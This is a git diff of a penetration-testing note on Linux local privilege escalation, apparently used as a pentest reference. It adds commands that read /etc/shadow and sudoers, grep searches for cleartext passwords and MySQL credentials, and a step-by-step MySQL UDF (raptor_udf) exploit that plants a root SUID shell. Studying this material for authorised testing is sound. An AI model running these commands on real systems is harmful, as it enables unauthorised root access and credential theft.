@@ -11,6 +11,40 @@ refer to the [General] Shells note.
 
 ### Enumeration
 
+###### Basic enumeration
+
+| Description | Command |
+|-------------|---------|
+| OS | cat /etc/*-release <br/>cat /etc/lsb-release |
+| Kernel | uname -a <br/> cat /proc/version <br/> rpm -q kernel |
+| Current user | id <br/>whoami |
+| All users    | cat /etc/passwd |
+| Current user sudo rights | sudo -l |
+| Sudo configuration – Privileged command | cat /etc/sudoers |
+| Super users | awk -F: '($3 == "0") {print}' /etc/passwd |
+| Logged in users | who -a <br/> w <br/> finger <br/> pinky <br/> users |
+| Logged in history from /var/log/lastlog | lastlog <br/> lastlog PIPE grep -v "Never" |
+| Users hashes – Privileged command | cat /etc/shadow <br/> (AIX Linux) cat /etc/security/passwd	|
+
+###### Writable directories
+
+Being able to write files on the system is needed for scripting the enumeration
+process and exploiting kernel vulnerabilities.  
+
+The following directories are usually writable to all:
+
+```
+/dev/shm
+/tmp
+```
+
+To find directories the current user can write into:
+
+```
+find / -perm -2 -type d 2>/dev/null
+find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -lahd {} \; 2>/dev/null
+```
+
 ###### Enumeration scripts
 
 Most of the enumeration process detailed below can be automated using
@@ -92,67 +126,6 @@ python linux-soft-exploit-suggester.py --update
 python linux-soft-exploit-suggester.py --file <PACKAGE_LIST> --db files_exploits.csv
 ```
 
-###### Basic enumeration
-
-| Description | Command |
-|-------------|---------|
-| OS | cat /etc/*-release <br/>cat /etc/lsb-release |
-| Kernel | uname -a <br/> cat /proc/version <br/> rpm -q kernel |
-| Current user | id <br/>whoami |
-| All users    | cat /etc/passwd |
-| Current user sudo rights | sudo -l |
-| Sudo configuration – Privileged command | cat /etc/sudoers |
-| Super users | awk -F: '($3 == "0") {print}' /etc/passwd |
-| Logged in users | who -a <br/> w <br/> finger <br/> pinky <br/> users |
-| Logged in history from /var/log/lastlog | lastlog <br/> lastlog PIPE grep -v "Never" |
-| Users hashes – Privileged command | cat /etc/shadow <br/> (AIX Linux) cat /etc/security/passwd	|
-
-###### Writable directories
-
-Being able to write files on the system is needed for scripting the enumeration
-process and exploiting kernel vulnerabilities.  
-
-The following directories are usually writable to all:
-
-```
-/dev/shm
-/tmp
-```
-
-To find directories the current user can write into:
-
-```
-find / -perm -2 -type d 2>/dev/null
-find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -lahd {} \; 2>/dev/null
-```
-
-###### Installed packages and binaries
-
-The installed programs should be reviewed for potential known vulnerabilities.    
-To review the installed programs on the target:
-
-```bash
-dpkg -l
-apt list --installed
-rpm -qa
-ls -lah /usr/bin
-ls -lah /usr/sbin
-```
-
-###### Running process and services
-
-The process and services running should be reviewed for known exploits, with
-a special attention given to the processes running under root privileges.
-The command line arguments used to start the process should be reviewed for
-sensible information.  
-
-The current processes can be listed using the ps Linux utility:
-
-```
-ps -aux
-ps -ef
-```
-
 ###### Scheduled tasks
 
 Look for tasks running as root from script that you can modify:
@@ -193,6 +166,9 @@ find / -name "*.conf" -print0 | xargs -0 grep -Hi "pass"
 # All files
 find / -type f -print0 | xargs -0 grep -Hi "pass"
 find / -type f -print0 | xargs -0 grep -Hi "password"
+
+# PHP MySQL connect for Linux Apache MySQL PHP (LAMP) server
+find / -type f -name "*.php" -print0 | xargs -0 grep -Hi "mysql_connect"
 ```
 
 ###### Users home directories content
@@ -328,7 +304,7 @@ https://gtfobins.github.io/
 (Source https://github.com/GTFOBins/GTFOBins.github.io)
 ```
 
-###### Path exploit
+###### PATH exploit
 
 If a binary with the SUID/SGID bit set runs another binary with out
 specifying its full path, it can be leveraged to escalate privileges on the
@@ -357,7 +333,7 @@ The exploit sequence is as follow:
 
 2. Create a binary named after the binary called by the SUID/SGID binary in the
    added folder.   
-   If the arguments used for the call permit it, bash or sh can be used
+   If the arguments used for the call permit it, `bash` or `sh` can be used
    directly.  
    If not, the following C code can be used to compile a binary or a shell elf
    can be used ([General] Shells note):
@@ -409,9 +385,22 @@ find / -name php* 2>/dev/null
 ```
 
 If no compilers are available on the system, it is recommended to compile the
-exploit on a similar kernel and upload the binary to the target.
+exploit on a similar kernel and upload the binary to the target,  refer to
+the `General - File transfer` note to do so.
+
+Verify the transferred binary integrity using the Linux builtin `md5sum`.
 
 ###### OS and kernel versions
+
+To retrieve the Linux operating system and kernel versions:
+
+```
+cat /etc/*-release
+cat /etc/lsb-release
+uname -a
+cat /proc/version
+rpm -q kernel
+```
 
 ###### Installed packages and binaries
 
@@ -430,8 +419,85 @@ ls -lah /usr/bin
 ls -lah /usr/sbin
 ```
 
+###### File transfer
+
+To transfer the exploit code on the target box, refer to the `General - File
+transfer` note.
+
 ###### Exploits detection tools
+
+The enumeration scripts linux-exploit-suggester.sh can be used on or off target,
+if provided with the `uname -a` output and the installed packages list
+(`dpkg -l` or `rpm -qa` command output), to enumerate potential exploits for
+the targeted box.   
+
+Refer to the "Enumeration - Enumeration scripts" part above for more information
+and usage guides to the most well known local exploit suggester scripts.  
+
+### Processes and services
+
+###### Enumerate running processes and services
+
+The processes and services running should be reviewed for known exploits, with
+a special attention given to the processes running under root privileges.
+The command line arguments used to start the process should be reviewed for
+sensible information.  
+
+The current processes can be listed using the ps Linux utility:
+
+```
+# Processes - equivalent ouput between -aux / -ef
+ps -aux
+ps -ef  
+ps -aux | grep root
+ps -ef | grep root
+
+# Listening services
+netstat -antup
+```
+
+###### MySQL
+
+If MySQL is running under root privileges and MySQL credentials for an user
+with FILE privileges are known, local privilege escalation can be achieved
+through the process. Refer to the `File system - Clear text passwords in files`
+part above for finding potential MySQL credentials present on the server. A
+blank password for the root user account is worth trying as well, especially if
+the MySQL service is only exposed locally on the server.
+
+The `raptor_udf.c` (https://www.exploit-db.com/raw/1518) dynamic library can
+be used to leverage those pre requisites to conduct a local privilege
+escalation.
+
+```
+gcc -g -c raptor_udf.c
+gcc -g -shared -W1,-soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
+mysql -u root -p
+mysql> use mysql;
+mysql> create table foo(line blob);
+# Do not forget to change <PATH>
+mysql> insert into foo values(load_file('<PATH>/raptor_udf.so'));
+mysql> select * from foo into dumpfile '/usr/lib/raptor_udf.so';
+mysql> create function do_system returns integer soname 'raptor_udf.so';
+mysql> select * from mysql.func;
+* +-----------+-----+---------------+----------+
+* | name      | ret | dl            | type     |
+* +-----------+-----+---------------+----------+
+* | do_system |   2 | raptor_udf.so | function |
+* +-----------+-----+---------------+----------+
+
+# Test the privileges obtained
+mysql> select do_system('id > /tmp/out; chmod 0755 /tmp/out');
+
+# Refer to General - Shells - Binary - Linux C binary for SUID shell for the source C code for the SUID sh binary  
+mysql> select do_system('chown root.root /tmp/suid; chmod 4755 /tmp/suid');
+
+mysql> \! sh  
+sh$ /tmp/suid
+```
 
 ### Sudo
 
 ### Cron jobs
+
+### Root write access
